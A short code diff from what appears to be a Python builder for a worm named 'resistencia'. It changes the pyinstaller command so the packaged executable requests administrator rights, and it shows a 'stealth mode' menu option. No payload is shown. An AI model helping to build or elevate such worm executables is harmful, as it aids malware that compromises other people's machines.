@@ -141,11 +141,8 @@ if __name__ == "__main__":
                 print("[+] Creating EXE of Worm!")
                 time.sleep(1)
 
-                os.system("pyinstaller resistencia-exe.py --onefile --name resistencia")
+                os.system("pyinstaller resistencia-exe.py --onefile --uac-admin --name resistencia")
                 print("[+] resistencia.exe Created")
-
-                
-                print("[!] given admin premissions to resistencia.exe")
 
                 time.sleep(1)
             case 3: # modo furtivo
